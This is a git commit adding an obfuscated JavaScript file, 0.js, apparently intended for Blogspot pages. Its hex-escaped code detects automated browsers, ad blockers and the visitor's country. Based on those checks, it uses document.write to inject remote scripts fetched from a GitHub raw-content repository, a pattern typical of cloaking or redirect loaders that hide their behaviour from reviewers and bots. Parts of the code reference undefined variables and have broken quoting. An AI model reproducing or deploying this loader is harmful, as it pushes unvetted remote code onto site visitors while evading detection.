1fc25f67d74065861f632570fa2db78a182ab52a
cakdumek <57629731+cakdumek@users.noreply.github.com>
2021-01-05 23:11:14 +0700

    Create 0.js

---
+++ 0.js
@@ -0,0 +1,269 @@
+y=/[^-'0-9A-Za-zÂªÂµÂºÃ€-Ã–Ã˜-Ã¶Ã¸-ËË†-Ë‘Ë -Ë¤Ë¬Ë®Í°-Í´Í¶Í·Íº-Îˆ-ÎŠÎŒÎŽ-Î¡Î£-ÏµÏ·-ÒÒŠ-Ô§Ô±-Õ™Õ¡-Ö‡×-×ª×°-×²Ø -ÙŠÙ®Ù¯Ù±-Û“Û•Û¥Û¦Û®Û¯Ûº-Û¼Û¿ÜÜ’-Ü¯Ý-Þ¥ßŠ-ßªß´ßµßºà €-à •à šà ¤à ¨à¡€-à¡˜à¢¢-à¢¬à¤„-à¤¹à¤½à¥à¥˜-à¥±-à¥¹-à¥¿à¦…-à¦Œà¦à¦à¦“-à¦¨à¦ª-à¦°à¦²à¦¶-à¦¹à¦½à§Žà§œà§à§Ÿ-à§¡à§°à§±à¨…-à¨Šà¨à¨à¨“-à¨ª-à¨°à¨³à¨µà¨¶à¨¸à¨¹à©™-à©žà©²-à©´-àªàª-àª‘àª“-àª¨àªª-àª°àª²àª³àªµ-àª¹àª½à«à« à«¡à¬…-à¬Œà¬à¬à¬“-à¬¨à¬ª-à¬°à¬²à¬µ-à¬¹à¬½à­œà­Ÿ-à­¡à­±à®ƒ-à®Šà®Ž-à®à®’-à®•à®™à®šà®œà®žà®£à®¤à®¨-à®ªà®®-à®¹à¯à°…-à°Œà°Ž-à°à°’-à°¨à°ª-à°³-à°¹à°½à±™à± à±¡à²…-à²Œà²Ž-à²à²’-à²¨à²ª-à²³à²µ-à²¹à²½à³žà³ à³±à³²à´…-à´Œà´Ž-à´à´’-à´ºà´½àµ àµº-àµ¿à¶…-à¶–à¶š-à¶±à¶³-à¶½à·€-à·†à¸-à¸°à¸²à¸³à¹€-à¹†àº„àº‡àºˆàºŠàºàº”-àº—àº™-àºŸ-àº£àº¥àº§àºªàº«àº­-àº°àº²àº³à»€-à»„à»†à»œ-à»Ÿà¼€à½€-à½‡à½‰-à½¬-à¾Œá€€-á€ªá€¿á-á•áš-á¡á¥á¦á®-á°áµ-á‚á‚Žá‚ -áƒ…áƒ‡áƒ-áƒºáƒ¼-á‰ˆá‰Š-á‰-á‰–á‰˜á‰š-á‰á‰ -áŠˆáŠŠ-áŠáŠ-áŠ°áŠ²-áŠµáŠ¸-áŠ¾á‹€á‹‚-á‹…á‹ˆ-á‹–á‹˜-áŒ-áŒ•áŒ˜-ášáŽ€-áŽ-á´á-á™¬-á™¿áš-áššáš -áœ€-áœŒáœŽ-áœ‘-áœ±á€-á‘-á¬á®-á°áž€-áž³áŸœá  -á¡·á¢€-á¢¨á¢ªá¢°-á£µá¤€-á¤œá¥-á¥­-á¥´á¦€-á¦«á§-á§‡á¨€-á¨–á¨ -áª§á¬…-á¬³á­…-á­‹á®ƒ-á® á®®á®¯á®º-á¯¥á°€-á°£á±-á±á±š-á³©-á³¬á³®-á³±á³µá³¶á´€-á¶¿á¸€-á¼•-á¼á¼ -á½…á½ˆ-á½á½-á½—á½™á½›á½á½Ÿ-á½½á¾€-á¾´á¾¶-á¾¼á¾¾-á¿†-á¿Œá¿-á¿“á¿–-á¿›á¿ -á¿¬-á¿¶-á¿¼â±â¿â‚-â‚œâ„‚â„‡-â„“â„•â„™-â„â„¤â„¦â„¨â„ª-â„­â„¯-â„¼-â„¿â……-â…‰â…Žâ†ƒâ†„-â°®â°°-â±žâ± -â³¤â³«-â³®â³²â³³â´€-â´¥â´­â´°-âµ§âµ¯â¶€-â¶–-â¶¦â¶¨-â¶®â¶°-â¶¶â¶¸-â¶¾â·€-â·ˆ-â·Žâ·-â·–â·˜-â·žâ¸¯ã€…ã€†-ã€µã€»ã€¼ã-ã‚-ã‚Ÿã‚¡-ãƒ¼-ãƒ¿ã„…-ã„­ã„±-ã† -ã†ºã‡°-ã‡¿ã€-ä¶µä¸€-é¿Œê€€-ê’Œê“-ê“½ê”€-ê˜Œê˜-ê˜Ÿê˜ªê˜«-ê™®ê™¿-êš -ê›¥êœ—-êœŸêœ¢-êžˆ-êžŽ-êž“êž -êžªêŸ¸-ê ê ƒ-ê …-ê Œ-ê ¢ê¡€-ê¡³ê¢‚-ê¢³ê£²-ê£·ê¤Š-ê¤¥ê¤°-ê¥†ê¥ -ê¥¼ê¦„-ê¦²-ê¨¨ê©€-ê©‚ê©„-ê©‹ê© -ê©¶ê©º-êª±êªµêª¶êª¹-êª½ê«€ê«‚ê«›-ê« -ê«²-ê«´ê¬-ê¬†ê¬‰-ê¬Ž-ê¬–ê¬ -ê¬¨-ê¬®ê¯€-ê¯¢ê°€-íž°-íŸ†íŸ‹-ï¤€-ï©­ï©°-ï«™ï¬€-ï¬†ï¬“-ï¬—ï¬Ÿ-ï¬¨ï¬ª-ï¬¶ï¬¸-ï¬¼ï¬¾ï­€ï­ï­„ï­†-ï®±ï¯“-ï´½ïµ-ï¶ï¶’-ï·°-ï·»ï¹°-ï¹´ï¹¶-ï»¼ï¼¡-ï¼ºï½-ï½šï½¦-ï¾¾ï¿‚-ï¿‡-ï¿ï¿’-ï¿—ï¿š-ï¿œ]+/g;
+	cookieChoices={
+};
+	function iS(sr,so,os){
+	currentScript=document['currentScript'];
+		ok=function(sc,hl){
+		sp=document['createElement']('script');
+		sp['src']=sc;
+			sp['onload']=sp['onreadystatechange']=function(){
+			sp['onreadystatechange']=sp['onload']=null;
+			hl()
+		};
+		currentScript['insertAdjacentElement']('afterEnd',sp);
+		sp['onerror']=os
+	};
+		(function ko(){
+			if(sr['length']!==0){
+			ok(sr['shift'](),ko)
+		}
+			else{
+			so&&so()
+		}
+	}
+	())
+}
+	function Ih(sh){
+	document['getElementsByTagName']('head')[0]['insertAdjacentHTML']('beforeend',sh)
+}
+	function Il(hl){
+	Si=document['createElement']('script');
+	Si['textContent']=hl;
+	document['getElementsByTagName']('head')[0]['insertAdjacentElement']('beforeend',Si)
+}
+	function iH(hs){
+	document['getElementsByTagName']('body')[0]['insertAdjacentHTML']('beforeend',hs)
+}
+	function iL(lh){
+	Is=document['createElement']('script');
+	Is['textContent']=lh;
+	document['getElementsByTagName']('body')[0]['insertAdjacentElement']('beforeend',Is)
+}
+B$='\x3c\x73\x63\x72\x69\x70\x74 ';
+J$=B$+'\x3e';
+K$='<\/\x73\x63\x72\x69\x70\x74\x3e';
+K_=B$+' \x63\x68\x61\x72\x73\x65\x74\x3d\'\x55\x54\x46\x2d\x38\'\x20\x73\x72\x63\x3d\'';
+L_='\'\x3e'+K$;
+Q$='\x29'+K$;
+Y$=J$+'document["\x77\x72\x69\x74\x65"](';
+P$=new Date();
+q=P$['getMinutes']();
+r=('0'+q)['slice'](-2);
+o=P$['getHours']();
+p=('0'+o)['slice'](-2);
+l=P$['getDate']();
+m=('0'+l)['slice'](-2);
+j=P$['getMonth']();
+k=('0'+(j+1))['slice'](-2);
+i=P$['getFullYear']();
+Aa=p+r+m+k+i;
+s=Y_+q+l;
+for(s=s;
+s>3;
+	s=s-4){
+}
+n='\x6d\x61\x69\x6e';
+R$=n+'/';
+A$='\x2e\x6a\x73\x3f'+Aa;
+B$='\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x63\x61\x6b\x64\x75\x6d\x65\x6b\x2f\x6a\x73\x2f';
+I_='';
+m=0;
+B=[];
+c$='';
+abp=true;
+Z_=q+o;
+X_=q+l;
+s='.blogspot.';
+a=location['hostname'];
+e$=a['split'](s)[0];
+d=a;
+b=decodeURIComponent(location['href']);
+b=b['replace']('&n=','&m=')['replace'](/ /g,'+');
+n=K_+'//api.duckduckgo.com/?q=zxyw'+X_+'&amp;
+format=json&amp;
+callback=B.unshift'+L_+K_+'//www.startpage.com/sp/cdn/abp.js'+L_;
+d$=K_+B$+R$+'bd'+A$+L_;
+f$=K_+B$+R$+'db'+A$+L_;
+E=[];
+F='';
+g=K_+'https://geolocation-db.com/json/geoip.php?jsonp=E.push'+L_;
+X='';
+Xe='?m';
+c='';
+u='http://';
+g$=u;
+N_='/'+i+'/'+k+'/?';
+A='';
+z$='';
+A4=a;
+A3=a;
+	F_=J$+'if(abp){
+	I_+='D';
+	m=1
+}
+	if(B['length']<1){
+	I_+='E';
+	m=1
+}
+	if(E['length']>0&&E[0]['country_code']){
+	I_+='F';
+	F=E[0]['country_code'];
+		if(!window['name']){
+		window['name']=F
+	}
+}
+	if(F!='US'){
+	m=0
+}
+	if(!A3){
+	m=1
+}
+	if(!A4||m<1){
+	document['write'](W_)
+}
+	else{
+	document['write'](T_)
+}
+'+K$;
+	if(a['indexOf'](s)==-1){
+	b=b['split']('+&')[0];
+	f=b['split'](s)[0];
+	f=f['replace'](/[^-0-9a-z]+/g,'#')['split']('#');
+	f=f[f['length']-1];
+	e$=f;
+	c=f+s+b['split'](s)[1];
+	d=c['split']('/')[0];
+	a=d;
+	c=decodeURIComponent(c);
+	g$=b['split'](':')[0]+'://';
+	b=g$+c
+}
+	if(b['indexOf'](u)==-1){
+	g$='http://';
+	X_+=1
+}
+r=g$+a;
+Bc=r+'/';
+b$=r+N_;
+N_=b$;
+b=decodeURIComponent(b);
+b=b['replace']('?r=r-','?r=')['replace']('?w=w-','?w=')['replace']('?r=w=','?w=')['replace']('?r=w-','?w=')['replace']('?r-','?r=')['replace']('?s-','?r=')['replace']('?w-','?w=');
+b=b['replace']('?u-','?w=')['replace']('?t-','?t=')['replace']('?v-','?v=')['replace']('?x-','?x=')['replace']('?y-','?y=')['replace']('?z-','?z=')['replace'](/\?&/,'?');
+	if(b['indexOf']('m=1')>-1){
+	X='<br>';
+	X_+=1
+}
+	if(!X&&b['indexOf']('m=0')==-1){
+	b+='&m=0';
+	b=b['replace']('/&','/?')
+}
+	if(b['indexOf']('&m=')>-1){
+	Xe='&m'
+}
+b=b['replace']('.html','');
+b=b['split'](/\?p=|\?zx=|\?max-results=|\?updated-max=|\?template=|default\?/)[0];
+e=b;
+	if(e['indexOf']('m=')>-1){
+	z$=Xe+e['split'](Xe)[1]
+}
+	if(navigator['webdriver']){
+	m=1;
+	c$+='A'
+}
+h_=eval['toString']()['length'];
+	if(h_==33&&!window['chrome']){
+	m=1;
+	c$+='B'
+}
+	navigator['permissions']['query']({
+	'name':'notifications'
+}
+	)['then'](function(permissionStatus){
+		if(Notification['permission']==='denied'&&permissionStatus['state']==='prompt'){
+		m=1;
+		c$+='C'
+	}
+}
+);
+	if(b['indexOf']('m=')>-1){
+	A=b['split']('m=')[1]
+}
+	if(A['indexOf']('z')>-1){
+	n='';
+	g='';
+	A3='';
+	m=1
+}
+	if(A['indexOf']('f')>-1){
+	n='';
+	d$='';
+	A4=''
+}
+T_=K_+B$+R$+Y_+'c'+A$+L_;
+	if(typeof T$==='undefined'){
+	T$=Y$+'Z'+Q$;
+	T_+=T$
+}
+W_=T_['replace']('c.','B.');
+A=A['replace'](/00|10|01|11|02|12|a|b|c|d|e|y/,'x');
+	if(A['indexOf']('x')>-1){
+	n='';
+	d$='';
+	g='';
+	A4=''
+}
+G=e['split'](/\?m=|&/)[0];
+f=G['substring'](0,G['lastIndexOf']('/'))+'/';
+w=G['replace'](f,'');
+	if(w['indexOf']('q=')>-1){
+	w=w['split']('q=')[1]
+}
+	if(w!=''){
+	j$=2
+}
+P=0;
+G=G['replace'](Bc,'');
+	if(j$==1&&G['indexOf']('/')>-1){
+	P=1
+}
+_H='<meta content='width=device-width,initial-scale=1,maximum-scale=1' name='viewport'><base target='_blank'>';
+	k$=_H+'<style>*{
+	margin:0px;
+	font-weight:bold;
+	line-height:175%;
+	text-align:center
+}
+	p{
+	text-align:justify
+}
+	b{
+	color:green
+}
+	em{
+	color:red
+}
+	@media only screen and (max-device-width:480px){
+		html{
+		-webkit-text-size-adjust:none
+	}
+}
+';
+	T=k$+'h1{
+	font-size:150%
+}
+</style>';
+	if(b['indexOf']('m=1')>-1){
+		T=k$+'h1{
+		font-size:180%
+	}
+		div{
+		font-size:130%
+	}
+	</style>'
+}
+T+='</head><body>';
+	if(g){
+	W_+=f$;
+	n+=g
+}
+B_=n+F_;
